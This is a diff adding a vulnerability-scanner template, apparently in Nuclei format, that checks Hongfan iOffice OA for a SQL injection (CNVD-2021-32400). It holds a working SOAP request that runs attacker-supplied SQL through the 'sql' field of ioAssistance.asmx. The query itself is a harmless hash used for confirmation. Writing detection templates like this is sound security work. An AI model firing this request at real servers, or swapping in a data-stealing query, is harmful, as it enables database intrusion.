@@ -1,0 +1,35 @@
+id: poc-yaml-hongfan-ioffice-oa-cnvd-2021-32400-sqli
+
+info:
+  name: poc-yaml-hongfan-ioffice-oa-cnvd-2021-32400-sqli
+  author: Aurora
+  severity: high
+  tags: xray-converted,sqli,cnvd-2021-32400,ct-456715
+  reference:
+    - http://www.ioffice.cn/newsinfo/1616026.html
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+        <sql>select SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{rand_int(1000, 9999)}}')),3,32)</sql>
+        </GetLoginedEmpNoReadedInf>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<Column1>"
